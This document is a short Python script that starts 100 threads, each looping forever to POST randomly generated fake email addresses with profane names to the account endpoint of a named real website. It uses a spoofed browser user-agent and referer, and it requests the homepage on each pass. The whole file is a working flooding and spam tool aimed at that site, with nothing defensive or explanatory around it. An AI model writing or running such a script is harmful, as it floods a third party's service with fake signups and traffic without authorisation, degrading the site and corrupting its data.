import random
import requests
import time
from threading import Thread

data = {
    'email': f'fuck{random.randint(1, 100000000000000)}@bitch.com'
}
headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
    'referer': 'https://pointsprizes.com/'
}


def send_email():
    while True:
        data = {
            'email': f'fuck{random.randint(1, 100000000000000)}@bitch.com'
        }
        print(data)
        res = requests.post('https://pointsprizes.com/account', headers=headers, data=data)
        requests.get('https://pointsprizes.com')
        print(res.status_code)


if __name__ == '__main__':
    for _ in range(100):
        i = Thread(target=send_email)
        i.start()
